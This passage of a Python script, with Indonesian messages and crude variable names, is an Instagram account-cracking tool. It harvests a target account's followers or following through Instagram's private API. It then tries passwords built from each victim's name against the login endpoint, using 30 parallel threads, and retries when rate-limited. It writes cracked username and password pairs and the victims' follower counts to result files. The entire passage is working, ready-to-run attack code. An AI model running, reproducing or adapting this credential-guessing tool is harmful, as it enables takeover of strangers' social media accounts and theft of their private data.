        total = open("results/%s"%(file)).read().splitlines()
        print(" %s[%s#%s] --------------------------------------------"%(N,O,N));time.sleep(2)
        nm_file = ("%s"%(file)).replace("-", " ")
        hps_nm  = nm_file.replace(".txt", "").replace("OK", "").replace("CP", "").replace("cp_detektor", "").replace("invalid_ok", "")
        jalan(" [%s*%s] Hasil %scrack%s pada tanggal %s:%s%s%s total %s: %s%s%s"%(M,N,O,N,M,O,hps_nm,N,M,O,len(total),O))
        print(" %s[%s#%s] --------------------------------------------"%(N,O,N));time.sleep(2)
        for memek in total:
            kontol = memek.replace("\n","")
            titid  = kontol.replace(" [✓] "," \x1b[0m[\x1b[1;92m✓\x1b[0m]\x1b[1;92m ").replace(" [×] ", " \x1b[0m[\x1b[1;93m×\x1b[0m]\x1b[1;93m ")
            print("%s%s"%(titid,N));time.sleep(0.03)
        print(" %s[%s#%s] --------------------------------------------"%(N,O,N))
        raw_input('\n  [ %sKEMBALI%s ] '%(O,N));menu_igeh()
    elif pepek in['0','00']:
        moch_yayan()
    else:
        print('\n %s[%s×%s] menu [%s%s%s] tidak ada, cek menu nya bro!'%(N,M,N,M,pepek,N));time.sleep(2);menu_igeh()
def __followers__(cookie, id_target, limit, kuntul):
    global looping
    if kuntul in[""]:
        print('\n %s[%s×%s] jangan kosong kentod!'%(N,M,N));time.sleep(2);menu_igeh()
    elif kuntul in["1","01"]:
        url = "https://i.instagram.com/api/v1/friendships/{}/followers/?count={}".format(id_target, limit)
    elif kuntul in["2","02"]:
        url = "https://i.instagram.com/api/v1/friendships/{}/following/?count={}".format(id_target, limit)
    else:
        print('\n %s[%s×%s] menu [%s%s%s] tidak ada, cek menu nya bro!'%(N,M,N,M,kuntul,N));time.sleep(2);menu_igeh()
    with requests.Session() as ses:
        otw = ses.get(url, cookies=cookie, headers=headerz_api)
        for xxx in json.loads(otw.content)["users"]:
            username = xxx["username"]
            nama = xxx["full_name"].encode("utf-8")
            if len(status_foll) != 1:
                sys.stdout.write('\r [\x1b[1;92m*\x1b[0m] sedang mengumpulkan %s id... '%(len(yan))); sys.stdout.flush()
                yan.append(username+"|"+nama.decode("utf-8"))
                #open('Tes-dump.txt','a').write(f'{username}|{nama.decode("utf-8")}\n')
                looping+=1
            else:
                poll.append(username)
def peweh():
    with YayanGanteng(max_workers=30) as (__yayanXD__):
        for yntkts in yan:
            try:
                uid, name = yntkts.split('|')
                xz = name.split(' ')
                if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                    pwx = [name, xz[0]+"123", xz[0]+"12345"]
                else:
                    pwx = [name, xz[0]+"123", xz[0]+"12345"]
                __yayanXD__.submit(crack2, uid, pwx)
            except: pass
    exit("\n {N}[{H}#{N}] Crack selesai...")
def crack2(user, pwx):
    global looping, loping
    asww = len(pwx)
    for pas in pwx:
        if looping != 1:
            pass
        else:
            if len(status_foll) != 1:
                sys.stdout.write('\r [%s*%s] [crack] %s/%s -> OK-:%s - CP-:%s '%(O,N,str(loping),len(yan),len(ok),len(cp))),
                sys.stdout.flush()
                asww -= 1
            else:
                pass
        try:
            if user in ok or user in cp:
                break
            pw = pas.lower()
            try:
                headerz = {"User-Agent": user_agentz_api}
                with requests.Session() as ses:
                    urll = "https://www.instagram.com/"
                    data = ses.get(urll, headers=headerz).content
                    tokett = re.findall('{"config":{"csrf_token":"(.*)","viewer"', str(data))[0]
                header = {"Accept": "*/*","Accept-Encoding": "gzip, deflate, br","Accept-Language": "en-US,en;q=0.5","Host": "www.instagram.com","X-CSRFToken": tokett,"X-Requested-With": "XMLHttpRequest","Referer": "https://www.instagram.com/accounts/login/","User-Agent": user_agentz,
                         }
                param = {"username": user,"enc_password": "#PWD_INSTAGRAM_BROWSER:0:{}:{}".format(random.randint(1000000000, 99999999999), pw),"optIntoOneTap": False,"queryParams": {},"stopDeletionNonce": "","trustedDeviceRecords": {}
                        }
            except:
                header = {}
                param = {}
                pass
            with requests.Session() as ses:
                url = "https://www.instagram.com/accounts/login/?force_classic_login=&"
                respon = ses.post(url, data=param, headers=header)
                data = json.loads(respon.content);time.sleep(00.1)
                if "checkpoint_url" in str(data):
                    cepeh = "Checkpoint"
                    ingfo(user, pw, cepeh)
                    open('results/IG-CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write(" [×] "+user+"|"+pw+"\n")
                    cp.append(user)
                    break
                elif "userId" in str(data):
                    okeh = "Berhasil"
                    if len(status_foll) != 1:
                        ingfo(user, pw, okeh)
                        with open('results/IG-OK-%s-%s-%s.txt' % (ha, op, ta), 'a') as simpan:
                            simpan.write(" [✓] "+user+"|"+pw+"\n")
                        ok.append(user)
                    break
                elif "Please wait" in str(data):
                    sys.stdout.write('\r %s[%s!%s] Hidupkan mode pesawat 2 detik         '%(N,M,N)),
                    looping+=1
                    sys.stdout.flush()
                    pwx = [pw]
                    crack2(user, pwx)
                    loping -= 1
                else:
                    looping = 1
                    pass
        except requests.exceptions.ConnectionError:
            sys.stdout.write('\r %s[%s!%s] Tidak ada koneksi internet        '%(N,M,N)),
            sys.stdout.flush()
            looping+=1
            pwx = [pw]
            crack2(user, pwx)
            loping -= 1
        except:
            looping = 1
            pass
    loping+=1
def ingfo(user, pw, status):
    try:
        global idg, pengikut, mengikuti
        dta = requests.get("https://www.instagram.com/%s/?__a=1"%(user), headers={"User-Agent": user_agentz})
        dta_ = dta.json()["graphql"]["user"]
        nama = dta_["full_name"]
        idg = dta_["id"]
        pengikut = dta_["edge_followed_by"]["count"]
        mengikuti = dta_["edge_follow"]["count"]
        if status == "Berhasil":
            print("\r {N}[{H}#{N}] name      : {H}{nama}                 \n {N}[{H}#{N}] username  : {H}{user}                 \n {N}[{H}#{N}] password  : {H}{pw}                 \n {N}[{H}#{N}] followers : {H}{str(pengikut)}                 \n {N}[{H}#{N}] following : {H}{str(mengikuti)}                 \n")
        elif status == "Checkpoint":
            print("\n {N}[{K}#{N}] name      : {K}{nama}                 \n {N}[{K}#{N}] username  : {K}{user}                 \n {N}[{K}#{N}] password  : {K}{pw}                 \n {N}[{K}#{N}] followers : {K}{str(pengikut)}                 \n {N}[{K}#{N}] following : {K}{str(mengikuti)}                 \n")
        else:
            pass
    except: pass
loping= 1
if __name__ == '__main__':
    os.system('git pull')
    folder()
    menu()    